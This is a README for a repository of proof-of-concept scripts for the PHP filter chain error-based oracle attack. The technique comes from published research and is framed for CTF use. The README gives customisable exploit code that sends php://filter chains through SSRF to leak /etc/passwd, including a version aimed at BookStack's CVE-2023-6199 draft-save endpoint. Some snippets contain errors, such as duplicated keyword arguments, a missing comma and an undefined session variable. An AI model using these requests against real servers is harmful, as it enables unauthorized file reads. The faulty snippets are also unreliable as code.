# php_filter_chain_oracle_poc
## Overview

The Synacktiv team published an in-depth research article, *[PHP Filter Chains: File Read from Error-Based Oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle)*, initially disclosed at DownUnder CTF 2022. This research was based on a challenge by `@hash_kitten`, where players were tasked with leaking the `/flag` file from a vulnerable PHP-based infrastructure using **error-based oracles**.

Rather than diving into the deep technical internals (which can be reviewed in the **PoC comments**), this guide presents a **Procedural-Oriented Programming (POP) adaptation** of Synacktiv’s original Object-Oriented Programming (OOP) exploit [(available here)](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

This POP-based approach makes it easier to understand the attack’s step-by-step execution, allowing for **customization of key parameters** when adapting the exploit with just one script, especially for CTF challenges.

- This repository includes two Proof-of-Concept (PoC) scripts:
  - **`poc.py`** – The **standard version**, structured with wrapped functions that cleanly separate each phase of the exploit.
  - **`poc_procedure.py`** – A **more procedure-oriented** approach, specifically designed for **CTF scenarios**, allowing step-by-step customization of the exploitation process.

## Scenarios

PHP filter chain exploits typically require the following attack primitives for **Arbitrary File Read**:

### 1. LFR via SSRF

- **Objective:** Exploiting Server-Side Request Forgery (SSRF), so that we can interact with the server using URLs and PHP stream wrappers (`php://filter`).
- **Example:** CVE-2023-6199 in [BookStack](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/) demonstrates **Local File Read (LFR) via SSRF**.

### 2. Oracle Recovery 

- **Objective:** Capture server responses from oracle-based exploits.
- **Tooling:** Wireshark, tcpdump, or BurpSuite to inspect HTTP responses.
- **Example:** A classic CTF challenge demonstrating this method is available [here](https://github.com/4xura/Bianry4CTF/blob/main/Labyrinth/misc/misc_php_filter_chain_oracle.zip).

## Using the PoC

Before executing the PoC, you need to **customize the `req()` function** to define how the exploit interacts with the target server. Because the specific request method (GET/POST/other) and SSRF entry point will vary depending on the scenario.

A basic example: sending the filter chain via a GET request:

```py
def req(s):
    """ [!] Customize the logic of requests """ 
    file_to_leak = '/etc/passwd'
    chain = f"php://filter/{s}/resource={file_to_leak}"
    
    import requests
    url     = f'http://example.com/ssrf.php?url={chain}'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie"    : "sessionid=abcdefg123456",
    }
    response = requests.get(url=url, headers=headers=headers)
    
    """
    We send the requests and verify the responses
    If status_code == 200, returns False and stop brute forcing, 
    while we should continue when the server returns 500 (True)
    """
    return response.status_code == 500
```

To exploit [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/CVE-2023-6199), the `req()` function can be defined for example:

```py
def req(s):
    """ [!] Customize the logic of requests """ 
    file_to_leak = '/etc/passwd'
    chain = f"php://filter/{s}/resource={file_to_leak}"
    
    # Base64 encode the filter embedded inside an <img> tag 
    import base64
    chain_b64 = base64.b64encode(chain.encode("ascii")).decode("ascii")
    html = f"<img src='data:image/png;base64,{chain_b64}'/>"  
	
    # Send PUT requests to BookStack server 
    import requests
    target = 'https://bookstack.example.com/ajax/page/8/save-draft'
    headers = {
        "User-Agent"	: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X_CSRF_TOKEN"	: "abcdefghijklmn...",
        "Content-Type"	: "application/x-www-form-urlencoded"
        "Cookie"    	: "sessionid=abcdefg123456...",
    }
    data = {
        "name":"axura", 
        "html": html,
    }
    try:
        response = session.put(
                target,
                data=data,
            )       
    	return response.status_code == 500
    
    except requests.exceptions.ConnectionError:
        print("[-] Could not instantiate a connection")
        exit(1)
```

Once the `req()` function is properly configured, simply execute the script with:

```sh
python3 poc.py
```

If something went wrong (which is possible due to special request data conversion, base64 output filtering logic, or unexpected server responses), use the comments in the scripts to debug the exploit process.

>  More info can be found on https://4xura.com/web/poc-scripts-for-php-filter-chain-oracle-exploit-lfr-via-ssrf/

